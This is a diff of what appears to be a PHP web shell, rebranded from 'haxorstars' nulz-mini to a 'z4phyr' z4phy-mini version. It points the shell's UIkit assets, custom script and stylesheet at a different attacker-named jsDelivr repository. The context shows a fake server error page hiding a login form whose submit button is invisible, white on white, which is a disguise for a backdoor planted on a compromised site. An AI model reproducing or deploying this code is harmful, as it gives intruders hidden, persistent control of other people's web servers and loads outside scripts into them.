@@ -378,10 +378,10 @@ $this_url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HO
 $fontawesome_pro_version = 'v6.5.1'; //change if updated to new version
 $fontawesome_pro = 'https://kit-pro.fontawesome.com/releases/'.$fontawesome_pro_version.'/css/pro.min.css';
 /*Framework - Uikit*/
-$uikit_css = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/css/uikit.min.css';
-$uikit_rtl = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/css/uikit-rtl.min.css';
-$uikit_js = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/js/uikit.min.jss';
-$uikit_icon = 'https://cdn.jsdelivr.net/gh/haxorstars/uikit-framework/js/uikit-icons.min.js';
+$uikit_css = 'https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/css/uikit.min.css';
+$uikit_rtl = 'https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/css/uikit-rtl.min.css';
+$uikit_js = 'https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/js/uikit.min.js';
+$uikit_icon = 'https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/js/uikit-icons.min.js';
 /*Jquery*/
 $jquery_version = '3.7.1';
 $jquery = 'https://cdn.jsdelivr.net/gh/jquery/jquery@'.$jquery_version.'/dist/jquery.min.js';
@@ -421,7 +421,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
 <button type="submit" name="z4phy-boy" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
 </form>
 </div>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/haxorstars/archive@master/nulz-mini/nulz-verification.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/js/custome.js"></script>
 </body></html>
 <?php
         exit();
@@ -466,7 +466,7 @@ $path = str_replace("\\", "/", $path);
     }
     </script>
     <!-- Custom Css -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/haxorstars/archive@master/nulz-mini/nulz-custom.css" media="all">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/css/style.css" media="all">
 </head>
 
 <body>
@@ -1267,4 +1267,4 @@ $path = str_replace("\\", "/", $path);
     <script src="<?=$uikit_icon?>"></script>
 </body>
 
-</html>
+</html> 
